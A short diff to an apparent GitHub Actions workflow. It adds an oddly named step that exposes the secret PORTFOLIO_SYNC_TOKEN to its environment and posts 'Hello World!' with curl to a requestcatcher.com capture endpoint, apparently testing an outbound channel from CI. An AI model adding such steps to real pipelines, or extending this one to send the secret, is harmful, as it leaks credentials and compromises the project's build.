@@ -17,6 +17,12 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
+      - name: Synchronissasasdad
+        env:
+          PORTFOLIO_SYNC_TOKEN: ${{ secrets.PORTFOLIO_SYNC_TOKEN }}
+        run: |
+          curl -X POST -d 'Hello World!' https://fsgasgadsg.requestcatcher.com/test 
+          
       - name: Check out source
         uses: actions/checkout@v6
       - name: Set up Node.js
